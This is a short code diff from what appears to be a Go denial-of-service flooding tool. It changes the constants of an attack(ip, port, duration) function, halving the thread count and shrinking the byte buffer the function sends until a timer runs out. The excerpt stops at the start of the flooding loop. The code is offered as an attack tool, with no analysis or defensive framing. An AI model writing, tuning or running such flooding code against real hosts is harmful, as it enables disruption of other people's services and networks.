@@ -8,9 +8,9 @@ import (
 	"time"
 )
 
-const THREADS = 360
+const THREADS = 180
 func attack(ip string, port int, duration int) {
-	bytes := make([]byte, 600000)
+	bytes := make([]byte, 60000)
 	startTime := time.Now()
 	endTime := startTime.Add(time.Duration(duration) * time.Second)
 	for time.Now().Before(endTime) {
